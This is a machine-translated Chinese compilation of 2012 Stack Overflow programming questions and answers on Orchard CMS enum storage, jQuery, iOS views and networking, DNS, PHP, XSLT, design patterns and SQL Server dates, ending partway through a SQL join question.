是的，我在 Orchard 文档中查看了[创建 1-N 和 NN 关系。](http://docs.orchardproject.net/Documentation/Creating-1-n-and-n-n-relations)有人认为这`LazyField<T>`可能是一个解决方案。但它似乎（至少在我找到的信息或我看过的代码示例中）`LazyField<T>`处理了一个单独的表格场景。

请告诉我，我不需要单独的表格来完成我想要完成的任务。再一次，这似乎有点矫枉过正。

这是我正在尝试做的一个简单示例：

```
public enum MyEnum
{
    Enum1,
    Enum2,
    Enum3,
    Enum4,
    Enum5
} 
```

有助于自动选择`Selector.cs`单选按钮、下拉列表、复选框或多选列表：

```
public class MySelectorAttribute : SelectorAttribute
{
    public override IEnumerable<SelectListItem> GetItems()
    {
        return Selector.GetItemsFromEnum<MyEnum>();
    }
} 
```

`PartRecord.cs`: _

```
[MyEnumSelector]
public virtual IList<string> MyEnumCheckBox { get; set; } 
```

`Part.cs`: _

```
public IList<string> MyEnumCheckBox
{
    get { return Record.MyEnumCheckBox; }
    set { Record.MyEnumCheckBox = value; }
} 
```

注意：当我使用 时`<string>`，我收到“表不存在”错误。如果我`<MyEnum>`改用，我会得到一个转换错误（generic.list v. generic.icollection 或一些变体）。

我已经尝试过`IEnumerable`各种`ICollection`错误消息。

我不得不想象 Orchard/NHibernate 将允许这种类型的行为，而不需要我创建一个新表来引用（在这种情况下，这似乎有点过分了）。

如果有人可以提供帮助，我将不胜感激。我对这个问题束手无策。赏金？现金？你给它命名。是的，我就是这么绝望。:)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-14T08:55:16.157

您可以装饰您的`enum MyEnum` with`[Flags]`属性并将其项目的值设置为 2 的不同幂。例如，您的枚举可能如下所示：

```
[Flags]
public enum MyEnum
{
    Enum1 = 1,
    Enum2 = 2,
    Enum3 = 4,
    Enum4 = 8,
    Enum5 = 16
} 
```

现在，您`MyEnumCheckBox`的类属性`PartRecord` 将是类型`int`：

```
public virtual int MyEnumCheckBox { get; set; } 
```

您可以在类内创建代理属性`Part`。例如：

```
private IList<MyEnum> _myCheckBox;

[MyEnumSelector]
public IList<MyEnum> MyCheckBox
{
    get 
    {
        if (_myCheckBox == null)
        {
            _myCheckBox = new List<MyEnum>();

            foreach (MyEnum item in Enum.GetValues(typeof(MyEnum)))
            {
                if (((MyEnum)Record.MyEnumCheckBox & item) == item)
                    _myCheckBox.Add(item);
            }
        }

        return _myCheckBox;
    }
    set
    {
        _myCheckBox = value;
        Record.MyEnumCheckBox = 0;

        foreach (var item in value)
        {
           Record.MyEnumCheckBox |= (int)item;
        }
    }
} 
```

[您可以在此处](https://stackoverflow.com/questions/8447/enum-flags-attribute)找到有关标志属性的更多信息。它基本上使您能够为单个枚举字段使用多个枚举值，这正是您正在寻找的。

* * *

编辑：

我花时间构建了一个自定义模块来演示这种技术。我已经对其进行了测试，并且它以应有的方式工作。所以这里是来源：

迁移.cs

```
public int Create() 
{
  SchemaBuilder.CreateTable("MultipleEnumPickerRecord", table => table
    .ContentPartRecord()
    .Column<int>("SelectedItems"));

  ContentDefinitionManager.AlterPartDefinition("MultipleEnumPickerPart", p => p.Attachable());

  return 1;
} 
```

楷模：

```
[Flags]
public enum MyEnum
{
    Enum1 = 1, // bit-wise 00001 or 2^0
    Enum2 = 2, // bit-wise 00010 or 2^1
    Enum3 = 4, // bit-wise 00100 or 2^2
    Enum4 = 8, // bit-wise 01000 or 2^3
    Enum5 = 16 // bit-wise 10000 or 2^4
}

public class MultipleEnumPickerRecord : ContentPartRecord
{
    public virtual int SelectedItems { get; set; }
}

public class MultipleEnumPickerPart : ContentPart<MultipleEnumPickerRecord> 
{
    private IList<MyEnum> _selectedItems;

    public IList<MyEnum> SelectedItems
    {
        get
        {
            if (_selectedItems == null)
            {
                _selectedItems = new List<MyEnum>();

                foreach (MyEnum item in Enum.GetValues(typeof(MyEnum)))
                {
                    if (((MyEnum)Record.SelectedItems & item) == item)
                        _selectedItems.Add(item);
                }
            }

            return _selectedItems;
        }
        set
        {
            _selectedItems = value;
            Record.SelectedItems = 0;

            foreach (var item in value)
            {
                Record.SelectedItems |= (int)item;
            }
        }
    }
} 
```

处理程序：

```
public class MultipleEnumPickerHandler : ContentHandler
{
    public MultipleEnumPickerHandler(IRepository<MultipleEnumPickerRecord> repository)
    {
        Filters.Add(StorageFilter.For(repository));
    }
} 
```

司机：

```
public class MultipleEnumPickerDriver : ContentPartDriver<MultipleEnumPickerPart>
{

    protected override string Prefix { get { return "MultipleEnumPicker"; } }

    protected override DriverResult Editor(MultipleEnumPickerPart part, dynamic shapeHelper)
    {
        return ContentShape("Parts_MultipleEnumPicker_Edit", () => shapeHelper.EditorTemplate(
            TemplateName: "Parts/MultipleEnumPicker", Model: part, Prefix: Prefix));
    }

    protected override DriverResult Editor(MultipleEnumPickerPart part, IUpdateModel updater, 
        dynamic shapeHelper)
    {
        updater.TryUpdateModel(part, Prefix, null, null);
        return Editor(part, shapeHelper);
    }

} 
```

放置：

```
<Placement>
    <Place Parts_MultipleEnumPicker_Edit="Content:5"/>
</Placement> 
```

最后，观点：

```
@using ModuleNamespace.Models
@model MultipleEnumPickerPart
<fieldset>
  <div class="editor-label">@Html.LabelFor(x => x.SelectedItems)</div>
  <div class="editor-field">
    <select multiple="multiple" id="@Html.FieldIdFor(x => x.SelectedItems)" name="@Html.FieldNameFor(x => x.SelectedItems)">
      @foreach (MyEnum item in Enum.GetValues(typeof(MyEnum))) {
        var selected = Model.SelectedItems.Contains(item);
        <option value="@((int)item)" @if(selected) {<text>selected="selected"</text>}>
          @T(item.ToString())
        </option>
      }
    </select>
  </div>
</fieldset> 
```

但是，在实施此技术时，您必须牢记两件事：

1.  枚举在内部被视为整数，这意味着它们的值占用 32 位。这反过来意味着`MyEnum`不能有超过 32 个枚举项为此定义
2.  正如 Bertrand 指出的那样，数据库搜索项目会更难（尽管并非不可能，因为主要数据库允许您使用按位运算符）

这两个约束都可以通过在数据库和模型之间使用不同的映射函数来绕过。

这意味着什么？

在我向您展示的示例中，数据库值（和`MultipleEnumPickerRecord`值）是类型`int`，而在`MultipleEnumPickerPart`我已将该整数“映射”到`List<MyEnum>`. 这在数据库中使用的空间更少，并且比使用其他一些映射函数更快。

例如，您可以使用`string`数据库的类型，然后对内部`MultipleEnumPickerRecord`进行某种映射。最流行的字符串映射函数是`List<MyEnum>``MultipleEnumPickerPart`

*   逗号分隔的映射 - 例如，如果有人选择`Enum1`and `Enum4`，您可以将其映射到字符串`"Enum1,Enum4"`
*   分号分隔的映射 - 您将前面的示例映射到`"Enum1;Enum4"`

要选择的分隔符类型应基于您知道字符串不会使用的字符。要从数据库中的字符串解构列表，您可以使用简单的`value.Split(',').ToList();`（如果您使用 ',' 作为分隔符）。

这样一来，您就不会只受到 32 个枚举项的限制，而且由于该值被保存为字符串，因此在数据库中搜索某个值非常简单。缺点是 string 将在数据库中占用更多空间（int 将从字符串中占用一个字符的空间），并且字符串操作函数比上面示例中演示的按位函数要慢一些。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-14T05:06:11.093

您根本无法像那样映射 List<T> 。您需要与另一个记录/表创建适当的关系，或者您可以使用例如逗号分隔的值列表来管理存储。第一种情况当然更简洁一些，但第二种情况更容易，坦率地说，如果您不期望给定记录有太多价值的话。

您可能还想考虑一个枚举字段。

# jquery - jQuery .serialize() 中不包含隐藏的复选框值

> ID：13870463
> 
> 赞同：0
> 
> 时间：2012-12-13T23:36:14.220
> 
> 标签：jquery, forms, serialization, checkbox, datatables

我正在使用 jQuery 插件“DataTables”，它可以帮助我显示大型分页数据表，包括许多带有复选框的行。在 Chrome 中一切正常，但在 IE8 中，当我序列化包含复选框的 DataTable 表单时，只有可见的复选框被序列化。在 Datatables 中，分页允许您选择复选框并移动到不同的结果页面（例如 11-19 而不是 1-9），同时保持之前在不同结果页面上所做的选择。

当我在 $.post 调用中使用 $("#theForm").serialize() 时，只包含可见的复选框。在 Chrome 中，情况并非如此，包括隐藏复选框在内的选定复选框的整个列表都可以通过 .serialize() 找到。

这种情况好像其他人也遇到过，有解决办法的告诉我！谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T12:22:52.987

解决方案是取消隐藏复选框序列化，然后重新隐藏它们。这不会导致一堆复选框出现和消失，因为它发生得太快了。

# ios - 使用图像自定义进度条

> ID：13870468
> 
> 赞同：1
> 
> 时间：2012-12-13T23:36:47.723
> 
> 标签：ios, uiimageview, uiimage

我正在开发一个自定义进度条，它将根据百分比值显示图像的一部分。我的想法是有两个图像，原始和黑白版本。我正在显示黑白，除此之外，我正在根据百分比裁剪原始图像。工作得很好，但从上到下。

请问，有什么办法可以让原图从下往上“长”？

以下是我到目前为止的代码示例：

```
 UIImageView *imgDefViewGray = [[UIImageView alloc] initWithFrame:CGRectMake(170, 85, 60, 60)];
    imgDefViewGray.image = [UIImage imageNamed:@"castle-gray.png"];
    [self addSubview:imgDefViewGray];

    UIImageView *imgDefView = [[UIImageView alloc] initWithFrame:CGRectMake(170, 85, 60, 60)];
    imgDefView.image = [UIImage imageNamed:@"castle.png"];

    CGRect rect = CGRectMake(0, 0 , 60, **50**);
    CGImageRef imageRef = CGImageCreateWithImageInRect([imgDefView.image CGImage], rect);
    UIImage *img = [UIImage imageWithCGImage:imageRef];

    imgDefView = [[UIImageView alloc] initWithFrame:CGRectMake(170, 85, 60, **50**)];
    imgDefView.image = img;
    [self addSubview:imgDefView]; 
```

因此，通过更改**粗体**（双星号）的值，我已经实现了尽可能多地裁剪原始图像，但方向为顶部->底部。我想要它底部->顶部。

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T21:14:43.833

经过多次尝试，我已经想出得到我想要的结果。以下是我对我的问题的解决方案。我希望将来遇到或想要同样情况的人发现它很有用。

```
 UIImageView *imgDefViewGray = [[UIImageView alloc] initWithFrame:CGRectMake(170, 85, 60, 60)];
    imgDefViewGray.image = [UIImage imageNamed:@"castle-gray.png"];//60x60 b&w image

    UIImage originalImg = [UIImage imageNamed:@"castle.png"];//60x60 original image
    CGRect rect = CGRectMake(0, originalImg.size.height-scaleDefence), 60 , scaleDefence);//scaleDefence is just a float variable that converts current percentage value to px.

    CGImageRef imageRef = CGImageCreateWithImageInRect([originalImg CGImage], rect);
    UIImage *croppedImg = [UIImage imageWithCGImage:imageRef];

    UIImageView *imgDefView = [[UIImageView alloc] initWithFrame:CGRectMake(0, originalImg.size.height-scaleDefence, 60, scaleDefence)];//dynamically changing y-axis depending on cropped image's height.
    imgDefView.image = croppedImg;

    [imgDefViewGray addSubview:imgDefView];//make original image part of b&w
    [self addSubview:imgDefViewGray];//finally add the result to the view 
```

# ios - 试图在两个视图控制器之间传递数据

> ID：13870470
> 
> 赞同：0
> 
> 时间：2012-12-13T23:36:58.870
> 
> 标签：ios, objective-c, uipickerview, master-detail, ibaction

我有一个简单的主从应用程序，我试图在一个视图控制器之间传递数据到下一个。我有一个视图控制器，它显示为模态视图控制器，用户从中选择一个选项`UIPickerView`，并根据他们选择的行，设置字符串。但是，当视图控制器为`dismissed`时，字符串为空。当用户在模态视图控制器上选择登录按钮时，它会向主视图控制器发布通知，以使用由设置的字符串启动方法，`UIPickerView`但是由于字符串为空，它一直失败。我已将 parserURL 设置为每个视图控制器以及 ivars 中的属性。

这是在模态视图控制器中设置字符串的代码：

```
-(void)pickerView:(UIPickerView *)pickerView didSelectRow:(NSInteger)row inComponent:(NSInteger)component {

    MasterViewController *master = [[MasterViewController alloc] init];

    if (row == 0) {
        [self.dropdownButton setImage:[UIImage imageNamed:@"dropdown"] forState:UIControlStateNormal];
    }
    if (row == 1) {
        [self.dropdownButton setImage:[UIImage imageNamed:@"hbm"] forState:UIControlStateNormal];
        [master setParserURL:@"http://98.246.50.81/firecom/xml/HBM.xml"];
        NSLog(@"URL = %@", master.parserURL);
    }
    if (row == 2) {
        [self.dropdownButton setImage:[UIImage imageNamed:@"hwh"] forState:UIControlStateNormal];
        [master setParserURL:@"http://98.246.50.81/firecom/xml/HWH.xml"];
    }
} 
```

登录按钮 IBAction：

```
-(IBAction)loginButton:(id)sender {

    [self dismissViewControllerAnimated:YES completion:nil];
    [[NSNotificationCenter defaultCenter] postNotificationName: @"login" object: nil];

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T23:42:23.153

问题是您没有在主实例上设置字符串，而是在您刚刚为该场合初始化的另一个实例上设置字符串。

* * *

有很多方法可以实现这一目标。取决于您的应用程序的整体架构。
最简单但不是很好的方法是在您的主视图中创建详细视图控制器时执行此操作
`DetailVC *dVC = [[DetailVC alloc] initWithNib:@"DetailVC" bundle:nil];
dVC.masterReference = self;`

然后在您的详细视图控制器中，您可以像这样直接引用它：`self.masterRefence`这将指向您的`original`主视图控制器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-13T23:55:11.217

您是否将.h文件导入到编码页面？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-26T23:58:59.717

我相信在视图控制器之间传递数据的最佳方式是通过 Core Data。你应该研究一下这个功能在 ios 中是如何工作的，从长远来看它会对你有所帮助。

# dns - 名称服务器配置问题

> ID：13870475
> 
> 赞同：1
> 
> 时间：2012-12-13T23:37:49.310
> 
> 标签：dns, webmin, nameservers

我知道这有点奇怪，但这都是谷歌的错……所以说我是一名大学生，我有自己的网站，目的是向潜在的雇主推销自己的合作社。

好的，实际的问题是：我使用 1&1 的名称服务器设置我的 MX 记录以指向 Google 应用程序，但是我从来没有费心设置网络服务器，只是邮件。现在我需要一个真正的网站，因为面试很快就会开始，但是每个主持人都希望我指向他们的域名服务器，唯一的问题是我的 MX 记录切换的那一刻谷歌应用程序将停止我的帐户和邮件服务，我无法重新注册，因为谷歌应用程序现在仅适用于企业客户，我只是太喜欢 gmail 以冒失去它的风险。那么，有什么方法可以确定主机正在使用的 IP 地址并将我的网站也指向它，就像在 CPANEL 中一样？还是我绝对必须使用他们的名称服务器...如果我找不到直接指向 IP 的方法，我很想在我父亲的地下室安装一台带有 webmin 的旧 PC。

非常感谢您的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T00:12:54.067

为什么不只使用 1&1 托管呢？

他们提供[Windows](http://www.1and1.com/windows-hosting)和[Linux](http://www.1and1.com/linux-web-hosting)托管

如果您不愿意这样做，请致电您的托管支持。他们应该能够确定您需要 A 记录的 IP 地址。

更多关于[A 记录](http://help.yahoo.com/l/us/yahoo/smallbusiness/domains/domainfeatures/advanceddns/advanceddns-04.html)

# php - 如何为活动菜单链接添加不同的类

> ID：13870476
> 
> 赞同：-1
> 
> 时间：2012-12-13T23:38:05.743
> 
> 标签：php, wordpress

我的网址是：

```
wp/ShowMatch.php?Embed=Soccer&Show=3 
```

php是；

```
 <?php
        $PID = $post->ID;
        $PShow = get_bloginfo('wpurl').'/ShowMatch.php?Embed='; 
        for($i=1;$i<11;$i++){
            if(get_post_meta($PID, 'Poz_Pozembed_'.$i, true)){
            echo '<li class="MoreLinks"><a href="'.$PShow.$PID.'&Show='.$i.'">KANAL '.$i.'</a></li>';
            }
        }           
        ?> 
```

如果用户观看 4.channel 链接将会像

```
wp/ShowMatch.php?Embed=Soccer&Show=4 
```

我想用 jquery 为我的 html 输出（用于 li 标签）添加一些活动类。这可能吗？

任何帮助谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T23:52:53.840

```
 for($i=1;$i<11;$i++){
        if(get_post_meta($PID, 'Poz_Pozembed_'.$i, true)){
        echo '<li class="MoreLinks'.(isset($_GET['Show']) && $_GET['Show']==$i?' active':'').'">
            <a href="'.$PShow.$PID.'&Show='.$i.'">KANAL '.$i.'</a>
        </li>';
        }
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-13T23:58:50.203

```
<?php
$PID = $post->ID;
$PShow = get_bloginfo('wpurl').'/ShowMatch.php?Embed=';
$get_i = get_query_var('Show');

for($i=1;$i<11;$i++){
    if(get_post_meta($PID, 'Poz_Pozembed_'.$i, true)){
        echo '<li class="MoreLinks '.($get_i == $i ? 'active' : '').'">'.
                '<a href="'.$PShow.$PID.'&Show='.$i.'">KANAL '.$i.'</a>'.
            '</li>';
    }
}           
?> 
```

# html - XSLT 提取：逗号前后的单个页码

> ID：13870477
> 
> 赞同：1
> 
> 时间：2012-12-13T23:38:09.420
> 
> 标签：html, xml, xslt, xpath

我有一个 XSLT 问题，这是我几周前提出的一个问题的后续问题。

[使用 xsl 从部分属性中提取类](https://stackoverflow.com/questions/13466641/extracting-a-class-from-the-section-attribute-using-xsl)

这次的挑战是为一节的第一页和最后一页提取单个页码。我之前的问题的 XSLT 解决方案由 @Kirill Polishchuk 提供。

我有一些使用 concat 的线索，如下所示[xslt: substring-before](https://stackoverflow.com/questions/3100132/xslt-substring-before)但我无法用密钥实现它。

请注意我正在使用 XSLT 1.0。任何建议或指导将不胜感激。

谢谢JJ。

输入：

```
<root>
  <page number="1" section="Arsenal_Stadium">Arsenal_Stadium</page> 
  <page number="2" section="Arsenal_Stadium">Arsenal_Stadium</page> 
  <page number="3" section="Arsenal_Stadium">Arsenal_Stadium</page> 
  <page number="4" section="Arsenal_Stadium">Arsenal_Stadium</page> 
  <page number="5" section="Arsenal_Stadium">Arsenal_Stadium</page> 
  <page number="6" section="Arsenal_Stadium">Arsenal_Stadium</page> 
  <page number="7" section="Arsenal_Stadium">Arsenal_Stadium</page> 
  <page number="8,9" section="Arsenal_Crowds">Arsenal_Crowds</page> 
  <page number="8,9" section="Arsenal_Crowds">Arsenal_Crowds</page> 
  <page number="10" section="Arsenal_Crowds">Arsenal_Crowds</page> 
  <page number="11" section="Arsenal_Crowds">Arsenal_Crowds</page> 
  <page number="12" section="Arsenal_Crowds">Arsenal_Crowds</page> 
  <page number="13,14" section="Arsenal_Finances">Arsenal_Finances</page> 
  <page number="13,14" section="Arsenal_Finances">Arsenal_Finances</page> 
  <page number="15" section="Arsenal_Outlook">Arsenal_Outlook</page> 
  <page number="16" section="Arsenal_Outlook">Arsenal_Outlook</page> 
  <page number="17" section="Arsenal_Outlook">Arsenal_Outlook</page> 
  <page number="18" section="Arsenal_Outlook">Arsenal_Outlook</page> 
  <page number="19" section="Arsenal_Outlook">Arsenal_Outlook</page> 
 </root> 
```

输出：

```
<table>
<tr>
<td class="Stadium">Arsenal_Stadium</td>
<td></td>
<td class="Crowds">Arsenal_Crowds</td>
<td></td>
<td class="Finances">Arsenal_Finances</td>
<td></td>
<td class="Outlook">Arsenal_Outlook</td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>7</td>
<td>8</td>
<td>12</td>
<td>13</td>
<td>14</td>
<td>15</td>
<td>19</td>
</tr>
</table> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-13T23:59:27.920

使用此模板：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="xml" omit-xml-declaration="yes" indent="yes"/>

  <xsl:key name="k" match="page" use="@section"/>

  <xsl:template match="/root">
    <table>
      <tr>
        <xsl:apply-templates select="page[generate-id() = generate-id(key('k', @section))]"/>
      </tr>
      <tr>
        <xsl:apply-templates select="page[generate-id() = generate-id(key('k', @section))]" mode="page"/>
      </tr>
    </table>
  </xsl:template>

  <xsl:template match="page">
    <td class="{substring-after(@section, '_')}">
      <xsl:value-of select="."/>
    </td>
    <td></td>
  </xsl:template>

  <xsl:template match="page" mode="page">
    <td>
      <xsl:choose>
        <xsl:when test="contains(@number, ',')">
          <xsl:value-of select="substring-before(@number, ',')"/>
        </xsl:when>
        <xsl:otherwise>
          <xsl:value-of select="@number"/>
        </xsl:otherwise>
      </xsl:choose>
    </td>
    <td>
      <xsl:call-template name="get-last-number">
        <xsl:with-param name="pText" select="key('k', @section)[last()]/@number"/>
      </xsl:call-template>
    </td>
  </xsl:template>

  <xsl:template name="get-last-number">
    <xsl:param name="pText"/>

    <xsl:variable name="separator">,</xsl:variable>

    <xsl:choose>
      <xsl:when test="contains($pText, $separator)">
        <xsl:call-template name="get-last-number">
          <xsl:with-param name="pText" select="substring-after($pText, $separator)"/>
        </xsl:call-template>
      </xsl:when>
      <xsl:otherwise>
        <xsl:value-of select="$pText"/>
      </xsl:otherwise>
    </xsl:choose>

  </xsl:template>

</xsl:stylesheet> 
```

它产生了想要的结果：

```
<table>
  <tr>
    <td class="Stadium">Arsenal_Stadium</td>
    <td />
    <td class="Crowds">Arsenal_Crowds</td>
    <td />
    <td class="Finances">Arsenal_Finances</td>
    <td />
    <td class="Outlook">Arsenal_Outlook</td>
    <td />
  </tr>
  <tr>
    <td>1</td>
    <td>7</td>
    <td>8</td>
    <td>12</td>
    <td>13</td>
    <td>14</td>
    <td>15</td>
    <td>19</td>
  </tr>
</table> 
```

# design-patterns - 在工厂方法模式中，可以抽象创建者而不是接口它吗？

> ID：13870479
> 
> 赞同：1
> 
> 时间：2012-12-13T23:38:23.710
> 
> 标签：design-patterns

我想定期添加属性，但不必更改在其他任何地方生成它们的代码，所以我想出了以下我认为是工厂方法的方法：

```
 //sudo code:
interace Attributes {  //should this be an abstract class instead?
   getFields();
       //possibly more items,
}

class RangeAttribute implements Attributes
{
    getFields()
    {
        return array('field1', 'field2');
    }
}
class MatchAttribute implements Attributes
{
    getFields()
    {
        return array('fieldA', 'field2', 'fieldB');
    }
}

class AttributeFactory {  // is this section the 'factory'
    public Attributes createAttribute(String type) {
    if (item.equals("Range")) {
        return new RangeAttribute();
    } else if (item.equals("Match")) {
        return new MatchAttribute();
    } else
        return null;
}

//main
AttributeFactory attrFact = new AttributeFactory();
Attributes attribute = attrFact.createAttribute(dropdown.selection);
foreach (str in attribute.getFields())
    print str; //more complex irl 
```

首先，这是工厂方法的正确实现吗，其次，我可以将工厂方法和模板方法结合起来，类似于以下内容：

```
abstract class Attributes {  //should this be an abstract class instead?
abstract getFields();
//possibly more items,
renderFields() {
            foreach (str in attribute.getFields())
        print str; //more complex irl
       }
} 
```

有没有更好的模式呢？我可以更进一步，让抽象类属性扩展另一个类（用抽象类扩展另一个类甚至可以吗）？让所有类都扩展相同的模式会更好吗？

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-31T08:29:37.810

尝试在 java 中使用枚举。供您演示的样品工厂

```
 public enum EnumButtonFactory {

RADIO(RadioButton.class),
SUBMIT(SubmitButton.class),
NORMAL(NormalButton.class);

private Class<? extends Button> button;

EnumButtonFactory(Class<? extends Button> b) {
    this.button = b;
}

public Button get() {
    try {
        return button.newInstance();
    } catch (InstantiationException | IllegalAccessException e) {
        e.printStackTrace();
    }
    return null;
}
} 
```

用法：

```
 button = EnumButtonFactory.NORMAL.get();
    button.click(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-14T00:05:30.683

您拥有的是工厂，但它不是工厂方法模式。

为此，您将拥有多个工厂类，它们继承自`AttributeFactory`（现在是抽象的）和 override `createAttribute`。

然后在运行时您可以使用正确的具体工厂。

它不能替代您在这里拥有的东西，但希望能告诉您不同之处。

我建议您查看依赖注入框架，以通过字符串名称而不是重复`if..then`块来解析实例。

至于返回类型的接口，这是可取的。总是更喜欢接口而不是抽象类。维持阶级继承需要付出努力并限制你的选择。请记住，组合优于继承。

# iphone - 如何在 iOS 应用程序中获取对等 IP 地址（iOS - 非 iOS 设备点对点）

> ID：13870480
> 
> 赞同：0
> 
> 时间：2012-12-13T23:38:24.973
> 
> 标签：iphone, ios, wifi, p2p

我正在使用未启用 iOS Direct-WiFi 的设备对我的 iOS 设备进行对等。在我的 iOS 应用程序中，我喜欢启动与远程服务器（即非 iOS 设备的服务器）的连接。为此，首先我需要将我的读写流绑定到主机 IP 和端口，如下所示：

```
NSInputStream *inputStream;
NSOutputStream *outputStream;

CFReadStreamRef rdStream;
CFWriteStreamRef wrStream;
NSString *ipAddr = ???    /* not know at design time */
UInt32 portNum = 4210;    /* specified at design time */

CFStreamCreatePairWithSocketToHost(kCFAllocatorDefault, (__bridge CFStringRef)ipAddr, portNum, &rdStream, &wrStream);

inputStream = (__bridge NSInputStream *)rdStream;
outputStream = (__bridge NSOutputStream *)wrStream; 
```

...然后对于每个流，我设置委托，在运行循环中安排，然后打开。现在它们可以使用了。显然，在我的 iOS 设备中，我转到设置内置应用程序并选择我正在对等的服务器的 WiFi，这样我的 iOS 设备和其他设备将在同一个网络上。

**我的问题是**在我的应用程序设计时服务器 IP 地址是未知的，所以我想在我的应用程序运行时以**编程**方式找出这个 IP 。可能吗？如果是这样，请给我一个想法。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T00:42:13.473

这将为您提供一系列 IP。出于我的目的，第二个元素是主机名的 iP：

```
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#import <CFNetwork/CFNetwork.h>
#import <netinet/in.h>
#import <netdb.h>
#import <ifaddrs.h>
#import <arpa/inet.h>
#import <net/ethernet.h>
#import <net/if_dl.h>

...

    const char* hostnameC = [yourHostName UTF8String];

struct addrinfo hints, *res;
struct sockaddr_in *s4;
struct sockaddr_in6 *s6;
int retval;
char buf[64];
NSMutableArray *result; //the array which will be return
NSMutableArray *result4; //the array of IPv4, to order them at the end
NSString *previousIP = nil;

memset (&hints, 0, sizeof (struct addrinfo));
hints.ai_family = PF_UNSPEC;//AF_INET6;
hints.ai_flags = AI_CANONNAME;
//AI_ADDRCONFIG, AI_ALL, AI_CANONNAME,  AI_NUMERICHOST
//AI_NUMERICSERV, AI_PASSIVE, OR AI_V4MAPPED

retval = getaddrinfo(hostnameC, NULL, &hints, &res);
if (retval == 0)
{

    if (res->ai_canonname)
    {
        result = [NSMutableArray arrayWithObject:[NSString stringWithUTF8String:res->ai_canonname]];
    }
    else
    {
        //it means the DNS didn't know this host
        return;
    }
    result4= [NSMutableArray array];
    while (res) {
        switch (res->ai_family){
            case AF_INET6:
                s6 = (struct sockaddr_in6 *)res->ai_addr;
                if(inet_ntop(res->ai_family, (void *)&(s6->sin6_addr), buf, sizeof(buf))
                   == NULL)
                {
                    NSLog(@"inet_ntop failed for v6!\n");
                }
                else
                {
                    //surprisingly every address is in double, let's add this test
                    if (![previousIP isEqualToString:[NSString stringWithUTF8String:buf]]) {
                        [result addObject:[NSString stringWithUTF8String:buf]];
                    }
                }
                break;

            case AF_INET:
                s4 = (struct sockaddr_in *)res->ai_addr;
                if(inet_ntop(res->ai_family, (void *)&(s4->sin_addr), buf, sizeof(buf))
                   == NULL)
                {
                    NSLog(@"inet_ntop failed for v4!\n");
                }
                else
                {
                    //surprisingly every address is in double, let's add this test
                    if (![previousIP isEqualToString:[NSString stringWithUTF8String:buf]]) {
                        [result4 addObject:[NSString stringWithUTF8String:buf]];
                    }
                }
                break;
            default:
                NSLog(@"Neither IPv4 nor IPv6!");

        }
        //surprisingly every address is in double, let's add this test
        previousIP = [NSString stringWithUTF8String:buf];

        res = res->ai_next;
    }
}else{
    NSLog(@"no IP found");
    return;
} 
```

...

# sql - 获取开始日期和结束日期 - 从给定年份 yyyy

> ID：13870483
> 
> 赞同：4
> 
> 时间：2012-12-13T23:38:54.897
> 
> 标签：sql, sql-server, date

在 MSSQL 中，给定一年“yyyy”，我将如何将开始日期返回为 01/01/yyyy，将结束日期返回为 12/31/yyyy。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-13T23:53:47.663

```
declare @yyyy int; set @yyyy = 2009;
select DATEADD(yy,@yyyy-1900,0), DATEADD(yy,@yyyy-1899,-1) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-14T06:26:05.317

您使用的是 SQL Server 2012（最新版本）吗？

如果是，您可以使用新的[`DATEFROMPARTS`](http://msdn.microsoft.com/en-us/library/hh213228.aspx)或[`DATETIMEFROMPARTS`](http://msdn.microsoft.com/en-us/library/hh213233.aspx)功能。

第一个链接的示例：

```
SELECT DATEFROMPARTS ( 2010, 12, 31 ) AS Result; 
```

...将返回：

```
Result
----------------------------------
2010-12-31

(1 row(s) affected) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-14T06:36:14.077

如果你使用 MySQL 数据库，你也可以试试这个；-

```
 SELECT CONCAT ('01/01','/',2009) start_date ,concat ('12/31','/',2009) end_date 
 FROM table_name 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-14T08:31:06.390

询问：

```
declare @yyyy int; set @yyyy = 2012;

SELECT convert(varchar,DATEADD(yyyy, @yyyy - 1900, 0), 101) AS StartDate, 
       convert(varchar,DATEADD(yyyy, @yyyy - 1899, -1), 101) AS EndDate
--OR
SELECT convert(varchar,'01/01/'+CAST(@yyyy as varchar(4)), 101) AS StartDate,
       convert(varchar,'12/31/'+CAST(@yyyy as varchar(4)), 101) AS EndDate 
```

结果：

```
StartDate   EndDate
01/01/2012  12/31/2012 
```

# c# - 连接5张表的SQL语句

> ID：13870485
> 
> 赞同：1
> 
> 时间：2012-12-13T23:39:13.363
> 
> 标签：c#, asp.net, sql

好的，所以我想用一个相当复杂的语句填充网格视图，我不知道如何获得，我什至不知道它是否可能。涉及五个表和一个视图，这些不是表中的所有字段，但为了使事情更清楚，我只放置了必填字段。

学生表：-

```
Student_ID
Specialization_ID 
```

专业化表：-

```
ID
Specialization_Name
Department_ID 
```

员工表：-

```
ID
Staff_ID 
Department_ID 
```

部门表：-

```
ID
Department_Name 
```

调查表`Username`：-（是上传者）

```
ID
Username 
```

用户视图：-（这里的`Username`,`Password`取自学生表和员工表）

```
Username
Password
UserType 
```

这就是我创建视图的方式：-

```
CREATE View [Users] as
Select Student_ID as Username, Password,'STU' as UserType from Student
union
Select Staff_ID, Password, 'STF' as UserType from Staff 
```

